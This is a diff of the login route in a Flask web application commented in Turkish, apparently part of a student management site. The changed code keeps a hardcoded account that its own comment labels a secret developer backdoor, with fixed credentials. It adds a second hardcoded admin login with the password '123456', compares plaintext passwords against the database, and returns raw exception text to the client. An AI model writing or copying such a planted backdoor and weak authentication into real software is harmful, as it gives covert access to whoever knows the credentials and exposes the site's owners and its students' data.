@@ -121,21 +121,36 @@ def site_yonetimi():
 # --- MEVCUT YÖNETİM (ARKA PLAN) YÖNLENDİRMELERİ ---
 @app.route('/login', methods=['GET', 'POST'])
 def login():
-    # 1. Aşama: Kullanıcı butona tıklayıp sayfayı görüntülemek isterse (GET)
     if request.method == 'GET':
         return render_template('login.html')
         
-    # 2. Aşama: Kullanıcı şifre girip giriş yap butonuna basarsa (POST)
-    veri = request.json
-    if veri['kadi'] == 'tolgahan' and veri['sifre'] == 'kaya3827':
-        return jsonify({"mesaj": "Geliştirici Girişi Başarılı", "durum": True})
+    try:
+        veri = request.json
+        kadi = veri.get('kadi')
+        sifre = veri.get('sifre')
 
-    # Veritabanındaki diğer kullanıcıları kontrol et
-    kullanici = Kullanici.query.filter_by(kullanici_adi=veri['kadi'], sifre=veri['sifre']).first()
-    if kullanici:
-        return jsonify({"mesaj": "Giriş Başarılı", "durum": True})
+        # 1. Aşama: Gizli Geliştirici Hesabı (Arka Kapı)
+        if kadi == 'tolgahan' and sifre == 'kaya3827':
+            return jsonify({"mesaj": "Geliştirici Girişi Başarılı", "durum": True})
+
+        # 2. Aşama: Asıl Yönetici Hesabı (Arkadaşın/Kullanıcı için)
+        if kadi == 'admin' and sifre == '123456':
+            return jsonify({"mesaj": "Yönetici Girişi Başarılı", "durum": True})
+
+        # 3. Aşama: Veritabanındaki olası ekstra kullanıcıları kontrol et
+        try:
+            kullanici = Kullanici.query.filter_by(kullanici_adi=kadi, sifre=sifre).first()
+            if kullanici:
+                return jsonify({"mesaj": "Giriş Başarılı", "durum": True})
+        except Exception as e:
+            print("Veritabanı kontrol hatası:", e)
+            pass 
+            
+        # Hiçbiri tutmazsa
+        return jsonify({"mesaj": "Hatalı Kullanıcı Adı veya Şifre", "durum": False})
         
-    return jsonify({"mesaj": "Hatalı Kullanıcı Adı veya Şifre", "durum": False})
+    except Exception as e:
+        return jsonify({"mesaj": f"Sunucu hatası: {str(e)}", "durum": False})
 
 @app.route('/ogrenciler', methods=['GET'])
 def ogrenciler():
